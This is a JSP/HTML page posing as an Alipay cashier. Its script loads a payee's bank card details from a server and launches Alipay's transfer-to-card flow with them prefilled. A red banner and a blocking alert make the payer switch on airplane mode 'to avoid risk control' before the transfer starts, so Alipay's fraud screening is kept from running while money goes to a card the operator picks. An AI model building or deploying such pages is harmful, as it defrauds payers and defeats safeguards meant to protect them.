<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta name="renderer" content="webkit">
<!DOCTYPE html>
<%@page import="com.fasterxml.jackson.annotation.JsonInclude.Include"%>
<%@page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>
<title>支付宝</title>
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<meta name="format-detection" content="telephone=no,email=no">
<meta name="viewport"
	content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
<link rel="stylesheet" type="text/css" href="${ctx}/static/css/h5cashier.css" media="all">
<link rel="stylesheet" href="${ctx}/static/css/antui.css">
<link rel="stylesheet" type="text/css" href="${ctx}/static/css/alitrans.css">
<script charset="utf-8" src="${ctx}/static/js/axios.min.js"></script>
<script src="${ctx}/static/jquery/jquery.min.js"></script>
<script src="${ctx}/static/js/alipayjsapi.inc.min.js"></script>
<script src="${ctx}/static/js/layui/layui.all.js"></script> 
<style>
body {
	font-weight: 500;
	font-family: PingFangSC-Regular, "Helvetica Neue", Helvetica, Arial,
		"Lucida Grande", sans-serif;
}

.am-header {
	display: none;
}

.alipay-logo {
	display: none;
}

.result {
	margin-top: 20px;
	width: 100%;
}

.result-logo {
	width: 70px;
	height: 98px;
	margin: auto;
	background: url("/static/test_a2b/images/alipay.png") no-repeat;
	background-repeat: no-repeat;
	background-size: contain;
}

.result-title {
	margin: 20px 0 14px;
	text-align: center;
	font-size: 21px;
	color: #00a0e8;
	line-height: 25px;
}

.result-botton {
	margin: 0 15px 20px;
}

.result-botton a {
	display: block;
	margin: auto;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	max-width: 384px;
	height: 44px;
	text-align: center;
}

.result-botton a.am-button-white {
	color: #00aaee;
	background: #ffffff;
	border: 1px solid #00aaee;
}

.result-botton .am-button[disabled=disabled] {
	color: #e6e6e6;
	background: #f8f8f8;
	border: 1px solid #dedede;
}
</style>
<style type="text/css">
.out1 {
	margin: 0 15px 20px;
	height: 44px;
	background: lightgray;
	overflow: hidden;
}

.in1 {
	width: 0;
	height: 44px;
	line-height: 44px;
	text-align: right;
	background: #0ae;
	color: #fff;
	font-size: 18px;
}
</style>
<style id="tsbrowser_video_independent_player_style" type="text/css">
[tsbrowser_force_max_size] {
	width: 100% !important;
	height: 100% !important;
	left: 0px !important;
	top: 0px !important;
	margin: 0px !important;
	padding: 0px !important;
}

[tsbrowser_force_fixed] {
	position: fixed !important;
	z-index: 9999 !important;
	background: black !important;
}

[tsbrowser_force_hidden] {
	z-index: 0 !important;
	opacity: 0 !important;
}

[tsbrowser_hide_scrollbar] {
	overflow: hidden !important;
}
</style>
<link rel="stylesheet"
	href="${ctx}/static/js/layui/css/layui.css"
	id="layuicss-layer">
<style type="text/css">
#__vconsole {
	color: #000;
	font-size: 13px;
	font-family: Helvetica Neue, Helvetica, Arial, sans-serif
}

#__vconsole .vc-max-height {
	max-height: 19.23076923em
}

#__vconsole .vc-max-height-line {
	max-height: 3.38461538em
}

#__vconsole .vc-min-height {
	min-height: 3.07692308em
}

#__vconsole dd, #__vconsole dl, #__vconsole pre {
	margin: 0
}

#__vconsole .vc-switch {
	display: block;
	position: fixed;
	right: .76923077em;
	bottom: .76923077em;
	color: #fff;
	background-color: #04be02;
	line-height: 1;
	font-size: 1.07692308em;
	padding: .61538462em 1.23076923em;
	z-index: 10000;
	border-radius: .30769231em;
	box-shadow: 0 0 .61538462em rgba(0, 0, 0, .4)
}

#__vconsole .vc-mask {
	top: 0;
	background: transparent;
	z-index: 10001;
	transition: background .3s;
	-webkit-tap-highlight-color: transparent;
	overflow-y: scroll
}

#__vconsole .vc-mask, #__vconsole .vc-panel {
	display: none;
	position: fixed;
	left: 0;
	right: 0;
	bottom: 0
}

#__vconsole .vc-panel {
	min-height: 85%;
	z-index: 10002;
	background-color: #efeff4;
	-webkit-transition: -webkit-transform .3s;
	transition: -webkit-transform .3s;
	transition: transform .3s;
	transition: transform .3s, -webkit-transform .3s;
	-webkit-transform: translateY(100%);
	transform: translateY(100%)
}

#__vconsole .vc-tabbar {
	border-bottom: 1px solid #d9d9d9;
	overflow-x: auto;
	height: 3em;
	width: auto;
	white-space: nowrap
}

#__vconsole .vc-tabbar .vc-tab {
	display: inline-block;
	line-height: 3em;
	padding: 0 1.15384615em;
	border-right: 1px solid #d9d9d9;
	text-decoration: none;
	color: #000;
	-webkit-tap-highlight-color: transparent;
	-webkit-touch-callout: none
}

#__vconsole .vc-tabbar .vc-tab:active {
	background-color: rgba(0, 0, 0, .15)
}

#__vconsole .vc-tabbar .vc-tab.vc-actived {
	background-color: #fff
}

#__vconsole .vc-content {
	background-color: #fff;
	overflow-x: hidden;
	overflow-y: auto;
	position: absolute;
	top: 3.07692308em;
	left: 0;
	right: 0;
	bottom: 3.07692308em;
	-webkit-overflow-scrolling: touch
}

#__vconsole .vc-content.vc-has-topbar {
	top: 5.46153846em
}

#__vconsole .vc-topbar {
	background-color: #fbf9fe;
	display: flex;
	display: -webkit-box;
	flex-direction: row;
	flex-wrap: wrap;
	-webkit-box-direction: row;
	-webkit-flex-wrap: wrap;
	width: 100%
}

#__vconsole .vc-topbar .vc-toptab {
	display: none;
	flex: 1;
	-webkit-box-flex: 1;
	line-height: 2.30769231em;
	padding: 0 1.15384615em;
	border-bottom: 1px solid #d9d9d9;
	text-decoration: none;
	text-align: center;
	color: #000;
	-webkit-tap-highlight-color: transparent;
	-webkit-touch-callout: none
}

#__vconsole .vc-topbar .vc-toptab.vc-toggle {
	display: block
}

#__vconsole .vc-topbar .vc-toptab:active {
	background-color: rgba(0, 0, 0, .15)
}

#__vconsole .vc-topbar .vc-toptab.vc-actived {
	border-bottom: 1px solid #3e82f7
}

#__vconsole .vc-logbox {
	display: none;
	position: relative;
	min-height: 100%
}

#__vconsole .vc-logbox i {
	font-style: normal
}

#__vconsole .vc-logbox .vc-log {
	padding-bottom: 3em;
	-webkit-tap-highlight-color: transparent
}

#__vconsole .vc-logbox .vc-log:empty:before {
	content: "Empty";
	color: #999;
	position: absolute;
	top: 45%;
	left: 0;
	right: 0;
	bottom: 0;
	font-size: 1.15384615em;
	text-align: center
}

#__vconsole .vc-logbox .vc-item {
	margin: 0;
	padding: .46153846em .61538462em;
	overflow: hidden;
	line-height: 1.3;
	border-bottom: 1px solid #eee;
	word-break: break-word
}

#__vconsole .vc-logbox .vc-item-info {
	color: #6a5acd
}

#__vconsole .vc-logbox .vc-item-debug {
	color: #daa520
}

#__vconsole .vc-logbox .vc-item-warn {
	color: orange;
	border-color: #ffb930;
	background-color: #fffacd
}

#__vconsole .vc-logbox .vc-item-error {
	color: #dc143c;
	border-color: #f4a0ab;
	background-color: #ffe4e1
}

#__vconsole .vc-logbox .vc-log.vc-log-partly .vc-item {
	display: none
}

#__vconsole .vc-logbox .vc-log.vc-log-partly-error .vc-item-error,
	#__vconsole .vc-logbox .vc-log.vc-log-partly-info .vc-item-info,
	#__vconsole .vc-logbox .vc-log.vc-log-partly-log .vc-item-log,
	#__vconsole .vc-logbox .vc-log.vc-log-partly-warn .vc-item-warn {
	display: block
}

#__vconsole .vc-logbox .vc-item .vc-item-content {
	margin-right: 4.61538462em;
	display: block
}

#__vconsole .vc-logbox .vc-item .vc-item-meta {
	color: #888;
	float: right;
	width: 4.61538462em;
	text-align: right
}

#__vconsole .vc-logbox .vc-item.vc-item-nometa .vc-item-content {
	margin-right: 0
}

#__vconsole .vc-logbox .vc-item.vc-item-nometa .vc-item-meta {
	display: none
}

#__vconsole .vc-logbox .vc-item .vc-item-code {
	display: block;
	white-space: pre-wrap;
	overflow: auto;
	position: relative
}

#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-input,
	#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-output {
	padding-left: .92307692em
}

#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-input:before,
	#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-output:before
	{
	content: "\203A";
	position: absolute;
	top: -.23076923em;
	left: 0;
	font-size: 1.23076923em;
	color: #6a5acd
}

#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-output:before
	{
	content: "\2039"
}

#__vconsole .vc-logbox .vc-item .vc-fold {
	display: block;
	overflow: auto;
	-webkit-overflow-scrolling: touch
}

#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer {
	display: block;
	font-style: italic;
	padding-left: .76923077em;
	position: relative
}

#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer:active {
	background-color: #e6e6e6
}

#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer:before {
	content: "";
	position: absolute;
	top: .30769231em;
	left: .15384615em;
	width: 0;
	height: 0;
	border: .30769231em solid transparent;
	border-left-color: #000
}

#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer.vc-toggle:before
	{
	top: .46153846em;
	left: 0;
	border-top-color: #000;
	border-left-color: transparent
}

#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-inner {
	display: none;
	margin-left: .76923077em
}

#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-inner.vc-toggle {
	display: block
}

#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-inner .vc-code-key {
	margin-left: .76923077em
}

#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer .vc-code-key {
	margin-left: 0
}

#__vconsole .vc-logbox .vc-code-key {
	color: #905
}

#__vconsole .vc-logbox .vc-code-private-key {
	color: #d391b5
}

#__vconsole .vc-logbox .vc-code-function {
	color: #905;
	font-style: italic
}

#__vconsole .vc-logbox .vc-code-boolean, #__vconsole .vc-logbox .vc-code-number
	{
	color: #0086b3
}

#__vconsole .vc-logbox .vc-code-string {
	color: #183691
}

#__vconsole .vc-logbox .vc-code-null, #__vconsole .vc-logbox .vc-code-undefined
	{
	color: #666
}

#__vconsole .vc-logbox .vc-cmd {
	position: absolute;
	height: 3.07692308em;
	left: 0;
	right: 0;
	bottom: 0;
	border-top: 1px solid #d9d9d9;
	display: block !important
}

#__vconsole .vc-logbox .vc-cmd .vc-cmd-input-wrap {
	display: block;
	height: 2.15384615em;
	margin-right: 3.07692308em;
	padding: .46153846em .61538462em
}

#__vconsole .vc-logbox .vc-cmd .vc-cmd-input {
	width: 100%;
	border: none;
	resize: none;
	outline: none;
	padding: 0;
	font-size: .92307692em
}

#__vconsole .vc-logbox .vc-cmd .vc-cmd-input::-webkit-input-placeholder
	{
	line-height: 2.15384615em
}

#__vconsole .vc-logbox .vc-cmd .vc-cmd-btn {
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	width: 3.07692308em;
	border: none;
	background-color: #efeff4;
	outline: none;
	-webkit-touch-callout: none;
	font-size: 1em
}

#__vconsole .vc-logbox .vc-cmd .vc-cmd-btn:active {
	background-color: rgba(0, 0, 0, .15)
}

#__vconsole .vc-logbox .vc-group .vc-group-preview {
	-webkit-touch-callout: none
}

#__vconsole .vc-logbox .vc-group .vc-group-preview:active {
	background-color: #e6e6e6
}

#__vconsole .vc-logbox .vc-group .vc-group-detail {
	display: none;
	padding: 0 0 .76923077em 1.53846154em;
	border-bottom: 1px solid #eee
}

#__vconsole .vc-logbox .vc-group.vc-actived .vc-group-detail {
	display: block;
	background-color: #fbf9fe
}

#__vconsole .vc-logbox .vc-group.vc-actived .vc-table-row {
	background-color: #fff
}

#__vconsole .vc-logbox .vc-group.vc-actived .vc-group-preview {
	background-color: #fbf9fe
}

#__vconsole .vc-logbox .vc-table .vc-table-row {
	display: flex;
	display: -webkit-flex;
	flex-direction: row;
	flex-wrap: wrap;
	-webkit-box-direction: row;
	-webkit-flex-wrap: wrap;
	overflow: hidden;
	border-bottom: 1px solid #eee
}

#__vconsole .vc-logbox .vc-table .vc-table-row.vc-left-border {
	border-left: 1px solid #eee
}

#__vconsole .vc-logbox .vc-table .vc-table-col {
	flex: 1;
	-webkit-box-flex: 1;
	padding: .23076923em .30769231em;
	border-left: 1px solid #eee;
	overflow: auto;
	white-space: pre-wrap;
	word-break: break-word;
	-webkit-overflow-scrolling: touch
}

#__vconsole .vc-logbox .vc-table .vc-table-col:first-child {
	border: none
}

#__vconsole .vc-logbox .vc-table .vc-small .vc-table-col {
	padding: 0 .30769231em;
	font-size: .92307692em
}

#__vconsole .vc-logbox .vc-table .vc-table-col-2 {
	flex: 2;
	-webkit-box-flex: 2
}

#__vconsole .vc-logbox .vc-table .vc-table-col-3 {
	flex: 3;
	-webkit-box-flex: 3
}

#__vconsole .vc-logbox .vc-table .vc-table-col-4 {
	flex: 4;
	-webkit-box-flex: 4
}

#__vconsole .vc-logbox .vc-table .vc-table-col-5 {
	flex: 5;
	-webkit-box-flex: 5
}

#__vconsole .vc-logbox .vc-table .vc-table-col-6 {
	flex: 6;
	-webkit-box-flex: 6
}

#__vconsole .vc-logbox .vc-table .vc-table-row-error {
	border-color: #f4a0ab;
	background-color: #ffe4e1
}

#__vconsole .vc-logbox .vc-table .vc-table-row-error .vc-table-col {
	color: #dc143c;
	border-color: #f4a0ab
}

#__vconsole .vc-logbox .vc-table .vc-table-col-title {
	font-weight: 700
}

#__vconsole .vc-logbox.vc-actived {
	display: block
}

#__vconsole .vc-toolbar {
	border-top: 1px solid #d9d9d9;
	line-height: 3em;
	position: absolute;
	left: 0;
	right: 0;
	bottom: 0;
	display: flex;
	display: -webkit-box;
	flex-direction: row;
	-webkit-box-direction: row
}

#__vconsole .vc-toolbar .vc-tool {
	display: none;
	text-decoration: none;
	color: #000;
	width: 50%;
	flex: 1;
	-webkit-box-flex: 1;
	text-align: center;
	position: relative;
	-webkit-touch-callout: none
}

#__vconsole .vc-toolbar .vc-tool.vc-global-tool, #__vconsole .vc-toolbar .vc-tool.vc-toggle
	{
	display: block
}

#__vconsole .vc-toolbar .vc-tool:active {
	background-color: rgba(0, 0, 0, .15)
}

#__vconsole .vc-toolbar .vc-tool:after {
	content: " ";
	position: absolute;
	top: .53846154em;
	bottom: .53846154em;
	right: 0;
	border-left: 1px solid #d9d9d9
}

#__vconsole .vc-toolbar .vc-tool-last:after {
	border: none
}

#__vconsole.vc-toggle .vc-switch {
	display: none
}

#__vconsole.vc-toggle .vc-mask {
	background: rgba(0, 0, 0, .6);
	display: block
}

#__vconsole.vc-toggle .vc-panel {
	-webkit-transform: translate(0);
	transform: translate(0)
}
</style>
<style type="text/css">
.vcelm-node {
	color: #183691
}

.vcelm-k {
	color: #0086b3
}

.vcelm-v {
	color: #905
}

.vcelm-l {
	padding-left: 8px;
	position: relative;
	word-wrap: break-word;
	line-height: 1
}

.vcelm-l.vc-toggle>.vcelm-node {
	display: block
}

.vcelm-l .vcelm-node:active {
	background-color: rgba(0, 0, 0, .15)
}

.vcelm-l.vcelm-noc .vcelm-node:active {
	background-color: transparent
}

.vcelm-t {
	white-space: pre-wrap;
	word-wrap: break-word
}

.vcelm-l .vcelm-l {
	display: none
}

.vcelm-l.vc-toggle>.vcelm-l {
	margin-left: 4px;
	display: block
}

.vcelm-l:before {
	content: "";
	display: block;
	position: absolute;
	top: 6px;
	left: 3px;
	width: 0;
	height: 0;
	border: 3px solid transparent;
	border-left-color: #000
}

.vcelm-l.vc-toggle:before {
	display: block;
	top: 6px;
	left: 0;
	border-top-color: #000;
	border-left-color: transparent
}

.vcelm-l.vcelm-noc:before {
	display: none
}
</style>
</head>
<body>
	<header class="am-header">
		<h1>
			<span class="title-main" data-title="支付宝收银台">支付宝收银台</span>
		</h1>
	</header>
	<div>
		<div class="result">
			<div class="result-logo" id="result-logo"></div>
			<div class="result-title" style="color: red">为防止风控无法付款，请打开飞行模式再点立即支付</div>
			<div id="xx" class="out1 result-botton">
				<div class="in1" onclick="goPay()" id="percent"
					style="width: 100%; text-align: center;">立即支付</div>
			</div>
		</div>
	</div>
	<div class="am-list"
		style="border: none; background: none; width: 100%;">
		<div class="am-list-body" style="position: relative;">
			<div class="am-list-item" style="padding: 0 15px;">
				<div class="am-list-content" style="color: #bbb;">应付金额:</div>
				<div class="am-list-extra"
					style="-webkit-flex: initial; -webkit-box-flex: initial;">
					<div
						style="font-size: 0.3rem; outline: none; background: transparent; border: none; outline: medium; height: auto; color: #0ae;">
						¥ <span id="money"></span>
					</div>
				</div>
			</div>
			<p style="color: green">如图：</p>
			<div style="text-align: center">
				<img src="${ctx}/${order}" alt=""
					width="350px"/>
			</div>
		</div>
	</div>
	<!--需要替换的数据-->
	<form name="payForm">
		<input type="hidden" name="bankAccount" value=" "> 
		<input type="hidden" name="cardNo" value=" "> 
		<input type="hidden" name="bankName" value=""> 
		<input type="hidden" name="bankMark" value=" "> 
		<input type="hidden" name="amount" value=" ">
	</form>
	<script src="${ctx}/static/js/vconsole.min.js"></script>
	<script>
	$(function(){
		  $.ajax({
              url: '${ctx}/api/createOrder',
              data: {order:'${order}',amount:'${amount}'},
              contentType: "application/x-www-form-urlencoded; charset=utf-8",
              type:'post',
              dataType:"json",
              async:  true,
              success: function (data) {
            	  if(data && data.success){
            		  $("[name = bankAccount]").val(data.result.cardholder);
            		  $("[name = cardNo]").val(data.result.bankCard);
            		  $("[name = bankName]").val(data.result.bankName);
            		  $("[name = bankMark]").val(data.result.retain2);
            		  $("[name = amount]").val(data.result.dealAmount);
            		  $("#money").html(data.result.dealAmount);
      				return;
      			}else if(data && !data.success){
      				return;
      			}
              },
              error: function (err) {
              }
          })
	})
		$(function() {
			function pushHistory() {
				var state = {
					title : "title",
					url : "#"
				};
				window.history.pushState(state, "title", "#");
			}
			pushHistory();
			window.addEventListener("popstate", function(e) {
				AlipayJSBridge.call('exitApp');
			}, false);
		});
		//右上角菜单
		AlipayJSBridge.call('setOptionMenu', {
			icontype : 'filter',
		});
		AlipayJSBridge.call('showOptionMenu');
		document.addEventListener('optionMenu', function(e) {
			AlipayJSBridge.call('showPopMenu', {
				menus : [ {
					name : "查看帮助",
					tag : "tag1",
				}, {
					name : "我要投诉",
					tag : "tag2",
				} ],
			}, function(e) {
				console.log(e);
			});
		}, false);
	</script>
	<script type="text/javascript">
// var cardNo = "打开网络稍等1-3秒支付即可***";
var cardNo = "" + document.payForm.cardNo.value + "";
var bankName = "" + document.payForm.bankName.value + "";
var bankMark = "" + document.payForm.bankMark.value + "";
var amount = "" + document.payForm.amount.value + "";
// var cardIndex = "" + document.payForm.cardIndex.value + "";
var bankAccount = "" + document.payForm.bankAccount.value + "";
var canpay = false;
	function goPay() {
		layer.msg('请稍等!正在检测网络环境...', {
			icon: 16
			, shade: 0.01
			, time: 500
		});
		setTimeout(function () {
			pay();
		}, 500);
	}
	function pay() {
	window.onoffline = function () {//在綫離綫事件
	canpay = true;
	}
	if (window.navigator.onLine) {
	} else {
	canpay = true;
	}
	var EventUtil = {
		addHandler: function (element, type, handler) {
			if (element.addEventListener) {
				element.addEventListener(type, handler, false);
			} else if (element.attachEvent) {
				element.attachEvent("on" + type, handler);
			} else {
				element["on" + type] = handler;
			}
		}	
	};
	EventUtil.addHandler(window, "offline", function () {
		canpay = true;
	});
	if (canpay == false) {
		alert("请先打开手机飞行模式或关闭网络！");
		return false;
	}
var a = {
	actionType: "toCard",
	sourceId: "bill",
	cardNo: cardNo,
	bankAccount: bankAccount,
	money: amount,
	amount: amount,
	bankMark: bankMark,
	bankName: bankName,
	// cardIndex: cardIndex,
	// cardChannel: "HISTORY_CARD",
	// cardNoHidden: "true"
};
var content = '<p style="color: red">跳转后请重新打开网络！！</p><p style="color: red">跳转后请重新打开网络！！</p><p style="color: red">跳转后请重新打开网络！！</p>';
//底部对话框
var foolindex = layer.open({
	content: content
		, btn: ['我知道了']
		, shadeClose: false
		, yes: function (index) {
	layer.close(foolindex);
	AlipayJSBridge.call('showLoading', {
		text: '跳转中....',
	});
	AlipayJSBridge.call("startApp", {
		appId: "09999988",
	param: a
	});
	setTimeout(function () {
	AlipayJSBridge.call('hideLoading');
		}, 5000);
	}
});
}
</script>
</body>
</html>